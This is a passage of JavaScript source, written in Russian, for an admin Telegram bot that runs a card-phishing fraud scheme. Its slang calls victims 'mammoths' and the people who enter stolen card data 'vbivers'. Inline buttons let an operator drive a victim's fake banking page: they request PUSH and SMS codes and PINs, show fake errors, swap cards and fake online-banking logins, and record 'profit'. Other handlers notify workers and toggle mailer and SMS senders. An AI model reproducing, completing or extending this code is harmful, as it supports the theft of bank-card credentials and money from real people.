          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            // Главное
            [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],

            // Онлайн / Диалог / Фото
            [
              Markup.callbackButton("👁 Онлайн", `check_mamont_${log.ad.id}`),
              Markup.callbackButton(
                "🗨️ Диалог",
                `dialog_writer_${log.supportId}`
              ),
              Markup.callbackButton("🏞️ Фото", `log_${log.id}_photo`),
            ],

            // Кастомные PUSH / SMS
            [
              Markup.callbackButton("💬 C-PUSH", `log_${log.id}_myeror`),
              Markup.callbackButton("💬 C-SMS", `log_${log.id}_myerorfield`),
            ],

            // PUSH / SMS / ТОЧНЫЙ
            [
              Markup.callbackButton("📲 PUSH", `log_${log.id}_push`),
              Markup.callbackButton(
                "💰 ТОЧНЫЙ",
                `log_${log.id}_correctBalance`
              ),
              Markup.callbackButton("📤 SMS", `log_${log.id}_sms`),
            ],

            // Карта / Лимиты
            [
              Markup.callbackButton("💳 СМЕНА", `log_${log.id}_otherCard`),
              Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
            ],

            // Баланс / PIN
            [
              Markup.callbackButton("💸 ДЕП", `log_${log.id}_dep`),
              Markup.callbackButton("🔐 PIN", `log_${log.id}_pincode`),
            ],

            // Ошибки
            [
              Markup.callbackButton("❌ КОД", `log_${log.id}_wrong_code`),
              Markup.callbackButton("❌ ПУШ", `log_${log.id}_wrong_push`),
            ],

            // ЛК
            [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_fakeLk`)],
            [Markup.callbackButton("🔄 СМЕНА ЛК", `log_${log.id}_otherLk`)],
            [Markup.callbackButton("💳 НА КАРТУ", `log_${log.id}_card`)],
            // Блок / Разблок — обновлённый стиль
            [
              Markup.callbackButton("⛔ Блок. Карту", `log_${log.id}_banCard`),
              Markup.callbackButton(
                "✅ Разблок. Карту",
                `log_${log.id}_unbanCard`
              ),
            ],
            // Отказ
            [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_lsLeaveLk`)],
          ]),
        }
      );

      await ctx.telegram
        .pinChatMessage(ctx.from.id, msg.message_id, {
          disable_notification: true,
        })
        .catch((err) => console.error("Ошибка при закреплении:", err));
      await log.update({
        chatMsg2: msg.message_id,
      });

      await ctx.editMessageReplyMarkup(
        Markup.inlineKeyboard([
          [
            Markup.urlButton(
              `🔄 ${ctx.from.first_name}`,
              `t.me/${ctx.from.username}`
            ),
          ],
          [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
          [Markup.callbackButton("🚫 ОТКАЗАТЬСЯ", `log_${log.id}_leaveLk`)],
          [
            Markup.callbackButton(
              "❌ Отказать вбивера",
              `log_${log.id}_removeVbiver`
            ),
          ],
        ])
      );

      await ctx.telegram
        .sendMessage(
          log.ad.userId,
          `<b>ℹ️ Ваш лог ${log.ad.service.title} взят на вбив</b>

✍️ Вбивер: <b>@${ctx.from.username}</b>

📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>
`,

          {
          parse_mode: "HTML",
          reply_markup: getUserRoleKeyboard({
            ctx,
            log,
            supportId: log.supportId,
            isOperator: false,
          }),
        }
        )
        .catch((err) => err);

      if (user.operator != null) {
        const operator = await Operators.findOne({
          where: {
            userId: user.operator,
          },
        });

        ctx.telegram.sendMessage(
          operator.userId,
          `<b>ℹ️ Лог ${log.ad.service.title} взят на вбив</b>

✍️ Вбивер: <b>@${ctx.from.username}</b>

👤 Воркер: <b>${
          user.username ? `@${user.username}` : `Профиль (${log.ad.userId})`
        }</b>
      
📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price == null ? "отсутствует" : log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
           {
          parse_mode: "HTML",
          reply_markup: getUserRoleKeyboard({
            ctx,
            log,
            supportId: log.supportId,
            isOperator: true,
          }),
        }
        );
      }
    } else {
      ctx
        .answerCbQuery("❌ У вас нет доступа к этому действию.", true)
        .catch((err) => err);
    }
  } catch (err) {
    console.log(err);
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});
// Команда /senders
adminBot.command("senders", async (ctx) => {
  try {
    const service = await Service.findOne();
    if (!service) {
      return ctx.reply("⚠️ Настройки не найдены.");
    }

    const serviceKeys = Object.keys(service.toJSON()).filter(
      (key) =>
        key.startsWith("mailer") ||
        key.startsWith("screen") ||
        key.startsWith("sms")
    );

    if (serviceKeys.length === 0) {
      return ctx.reply("❌ Нет доступных сервисов для переключения.");
    }

    const buttons = serviceKeys.reduce((acc, key, index) => {
      const status = service[key] ? "✅ ON" : "❌ OFF";
      const button = Markup.callbackButton(
        `${key.toUpperCase()}: ${status}`,
        `toggle_${key}`
      );
      if (index % 2 === 0) {
        acc.push([button]);
      } else {
        acc[acc.length - 1].push(button);
      }
      return acc;
    }, []);

    await ctx.reply("🔧 Управление отправителями:", {
      reply_markup: Markup.inlineKeyboard(buttons),
    });
  } catch (err) {
    console.error("Ошибка в /senders:", err);
    ctx.reply("❌ Ошибка при получении настроек.");
  }
});

// Обработчик именно toggle_
adminBot.action(/^toggle_(.+)$/, async (ctx) => {
  try {
    const key = ctx.match[1]; // Вытаскиваем что после toggle_

    const service = await Service.findOne();
    if (!service || !(key in service)) {
      return ctx.answerCbQuery(
        "⚠️ Настройки не найдены или неправильный ключ."
      );
    }

    const currentValue = service[key];

    await Service.update({ [key]: currentValue ? 0 : 1 }, { where: {} });
    await ctx.answerCbQuery(
      `✔️ ${key.toUpperCase()} теперь ${currentValue ? "OFF" : "ON"}`
    );

    // Обновляем кнопки
    const updatedService = await Service.findOne();
    const updatedKeys = Object.keys(updatedService.toJSON()).filter(
      (k) =>
        k.startsWith("mailer") || k.startsWith("screen") || k.startsWith("sms")
    );

    const buttons = updatedKeys.reduce((acc, k, index) => {
      const status = updatedService[k] ? "✅ ON" : "❌ OFF";
      const button = Markup.callbackButton(
        `${k.toUpperCase()}: ${status}`,
        `toggle_${k}`
      );
      if (index % 2 === 0) {
        acc.push([button]);
      } else {
        acc[acc.length - 1].push(button);
      }
      return acc;
    }, []);

    await ctx.editMessageReplyMarkup(Markup.inlineKeyboard(buttons));
  } catch (error) {
    console.error("Ошибка обработки toggle:", error);
    ctx.answerCbQuery("❌ Ошибка переключения.");
  }
});
adminBot.command("help", help);
adminBot.action("admin_help", help);

module.exports = adminBot;
